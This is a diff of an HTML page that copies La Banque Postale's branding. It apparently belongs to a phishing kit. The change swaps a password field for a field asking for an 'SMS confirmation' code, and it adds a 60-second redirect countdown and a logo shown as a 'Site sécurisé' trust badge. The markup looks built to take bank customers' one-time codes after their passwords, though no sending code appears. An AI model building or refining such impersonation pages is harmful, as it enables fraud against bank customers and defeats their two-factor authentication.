@@ -140,20 +140,25 @@
         <img src="Logo_La_Banque_postale_2022.svg.png" alt="La Banque Postale" class="lbp-logo">
     </header>
 
-    <main class="lbp-main">
+        <main class="lbp-main">
         <div class="lbp-form-container">
-            <h1 class="lbp-form-title">Entrez votre mot de passe</h1>
+            <h1 class="lbp-form-title">Confirmation par SMS</h1>
+            <p class="lbp-form-description">Nous avons envoyé un code de vérification à votre numéro mobile enregistré.</p>
             
             <div class="lbp-input-group">
-                <label for="password" class="lbp-input-label">Code confidentiel (6 chiffres)</label>
-                <input type="password" id="password" class="lbp-input-field" inputmode="numeric" pattern="\d{6}" maxlength="6" required>
-                <div id="error-message" class="lbp-error-message">Veuillez entrer un code à 6 chiffres</div>
+                <label for="sms-code" class="lbp-input-label">Code de vérification (6 chiffres)</label>
+                <input type="text" id="sms-code" class="lbp-input-field" inputmode="numeric" pattern="\d{6}" maxlength="6" required>
+                <div id="error-message" class="lbp-error-message">Veuillez entrer le code à 6 chiffres</div>
             </div>
             
             <button id="submit-btn" class="lbp-submit-button">Valider</button>
             
-            <div class="lbp-forgot-password">
-                <a href="#">Code confidentiel oublié ?</a>
+            <div class="lbp-timer" id="timer">
+                Redirection automatique dans <span id="countdown">60</span> secondes
+            </div>
+
+            <div class="lbp-trust-badge">
+                <img src="Logo_La_Banque_postale_2022.svg.png" alt="Site sécurisé">
             </div>
         </div>
     </main>
